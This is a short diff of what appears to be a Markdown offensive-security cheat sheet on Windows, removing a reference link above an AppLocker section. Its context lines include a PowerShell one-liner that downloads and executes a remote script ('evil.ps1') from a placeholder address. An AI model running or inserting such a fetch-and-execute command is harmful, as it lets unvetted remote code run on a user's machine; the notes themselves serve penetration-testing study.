@@ -18,8 +18,6 @@ powershell - < ps1file
 iex (new-object net.webclient).downloadstring('http://192.168.0.1/evil.ps1')
 ```
 
-[http://pwnwiki.io/\#!presence/windows/blind.md](http://pwnwiki.io/#!presence/windows/blind.md)
-
 ## Applocker
 
 > AppLocker advances the app control features and functionality of Software Restriction Policies. AppLocker contains new capabilities and extensions that allow you to create rules to allow or deny apps from running based on unique identities of files and to specify which users or groups can run those apps.
